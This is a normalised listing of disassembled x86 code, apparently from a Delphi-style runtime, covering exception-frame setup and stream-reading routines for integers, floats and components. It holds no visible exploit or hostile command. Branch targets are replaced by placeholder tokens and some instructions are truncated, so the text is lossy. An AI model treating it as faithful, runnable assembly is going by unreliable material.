cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
call sub_428494
sub_428760
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_424b88
mov esi eax
xor edx edx
push ebp
push sub_4287d0
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4287d7
mov eax [ rw-data ]
call sub_424bec
retn
mov edx ebx
mov eax esi
call sub_4246e8
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_4481b0
mov edx ebx
mov eax esi
call sub_4245dc
sub_4287dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_428912
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428919
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
xor edx edx
push ebp
push sub_4288f5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_428944
retn
inc eax
mov [ ebp - 0x10 ] eax
xor esi esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4246e8
call sub_428760
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x7a ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_427f0c
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x7c ]
call [ edi + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4246e8
mov ebx eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_449d80
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_428008
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4246e8
mov edx eax
mov eax [ rw-data ]
call sub_424ab8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_424850
jmp r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
sub_428920
push ebx
mov ebx eax
mov eax ebx
call sub_428a14
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_427294
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_428944
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_4481b0
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4246e8
call sub_4481b0
inc edi
dec esi
jne r-xdata
sub_428980
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov edx [ edx ]
mov eax edx
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_423b8c
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x84 ]
test eax eax
je r-xdata
mov eax ebp
call sub_44813c
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_423c04
mov edi eax
mov edx [ esp + 0x4 ]
call sub_423b04
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4480a0
test al al
jne r-xdata
sub_428a50
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_428a9c
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_428a9c
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
sub_428aec
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_428b70
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_42a58c
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
dec eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
call sub_428494
movzx ebx [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428b77
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_428b80
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_428bd2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_42a674
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
dec eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
shr eax 0x1
mov eax [ ebp - 0x4 ]
movzx ebx [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428bd9
lea eax [ ebp - 0x4 ]
call sub_4499d8
retn
call sub_428494
sub_428be0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_428c80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_428668
test al al
jne r-xdata
mov eax ebx
call sub_428668
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_425430
jmp r-xdata
mov eax ebx
call sub_428a2c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_4297cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428c87
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_425354
mov esi eax
mov eax ebx
call sub_4297c4
jmp r-xdata
mov eax ebx
call sub_429714
mov eax ebx
call sub_428668
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_429900
mov eax ebx
call sub_4297cc
sub_428cb8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44af28
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x34 ]
call sub_424590
inc esi
dec ebx
jne r-xdata
sub_428cf4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_42e8d0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44af28
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov edx ebx
mov eax edi
call sub_42e8a4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44af28
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_42e8a4
test [ eax + 0x24 ] 0x4
je r-xdata
sub_428d6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44af28
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
movzx eax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
movzx eax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_428dd4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x18 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_428df4
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_447580
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_428dd4
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
xor edx edx
call sub_42aabc
call sub_447580
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_4481b0
sub_428e54
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_428f3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_42ac5c
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x72 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff8
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov ecx ebx
mov eax [ esi + 0x74 ]
call [ esi + 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x11 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_428f0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
or [ eax + 0x1c ] 0x200
sub_428f3f
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff8
call sub_428df4
pop ecx
test al al
jne r-xdata
call sub_448cfc
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_448ca8
sub_428f64
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_428fdc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xfff8
call sub_4483f8
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4240cc
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
or [ eax + 0x1c ] 0x200
sub_428fe1
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff8
call sub_428df4
pop ecx
test al al
jne r-xdata
call sub_448cfc
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_448ca8
sub_429004
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_42907f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_42ac5c
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xfff2
call sub_4483f8
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x10 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_429084
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff8
call sub_428df4
pop ecx
test al al
jne r-xdata
call sub_448cfc
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_448ca8
sub_4290a8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4292cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_42a4fc
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_42a4fc
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_42929c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test [ ebp - 0x11 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_42925a
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x8 ]
call sub_428cf4
pop ecx
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
movzx eax [ r-xdata ]
call sub_428d6c
pop ecx
test [ ebp - 0x11 ] 0x1
jne r-xdata
push ebp
call sub_428e54
pop ecx
push ebp
call sub_429004
pop ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push ebp
call sub_428f64
pop ecx
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_448d2c
jmp r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
movzx eax [ r-xdata ]
call sub_428d6c
pop ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
movzx eax [ r-xdata ]
call sub_428d6c
pop ecx
test [ ebp - 0x11 ] 0x2
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4292d6
lea eax [ ebp - 0x1c ]
call j_sub_449348
lea eax [ ebp - 0xc ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44b0fc
retn
test [ ebp - 0x11 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov si 0xfff9
call sub_4483f8
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x8 ]
call sub_424744
test eax eax
jge r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x8 ]
call sub_428cb8
pop ecx
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x8 ]
call sub_424590
jmp r-xdata
push ebp
mov eax [ ebp - 0x8 ]
call sub_428cb8
pop ecx
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x8 ]
call sub_424590
sub_42925f
push ebp
call sub_428dd4
pop ecx
test al al
je r-xdata
call sub_448ca8
call sub_448cfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x8 ]
call sub_4481b0
sub_4292e8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_429358
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_429343
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_429358
mov eax [ ebp - 0x4 ]
call sub_4287dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_428944
retn
sub_429358
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_428668
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_429900
mov eax [ ebp - 0x4 ]
call sub_4297cc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_4483f8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_42941a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_4483f8
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_428668
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4290a8
mov eax [ ebp - 0x4 ]
call sub_4297cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429421
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_429428
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_42a7b4
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_429460
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_428a50
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_429460
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_42a7b4
cmp al 0x15
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_429780
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_428a50
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_4294a4
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_42a7b4
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_429780
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_428a50
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_4294e8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_42a7b4
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_429780
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_428a50
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_429538
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_42a7b4
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_429780
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_428a50
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_42957c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4296a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_42a7b4
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_428494
movzx eax [ eax + lookup_table_4295bb ]
jmp [ eax * 4 + jump_table_4295c9 ]
lea edx [ ebp - 0x9 ]
mov ecx 0x1
mov eax ebx
call sub_428a50
push 0x0
movzx ecx [ ebp - 0x9 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_449444
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_449d2c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_449d2c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_449d2c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_449d2c
jmp r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_4498a8
mov edx eax
movzx ecx [ ebp - 0x9 ]
mov eax ebx
call sub_428a50
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44bca8
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_449d2c
jmp r-xdata
mov eax edi
sub eax 0xa
cmp [ eax ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4296af
lea eax [ ebp - 0x8 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call sub_449348
retn
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_44950c
mov edi eax
sub_429714
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_42a7b4
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_428a50
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_428a50
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_428a50
jmp r-xdata
jmp r-xdata
call sub_428494
sub_429780
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_428a2c
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_429714
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_42a7b4
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_428a50
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_4297d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx eax [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_428a2c
and al 0xf0
cmp al 0xf0
jne r-xdata
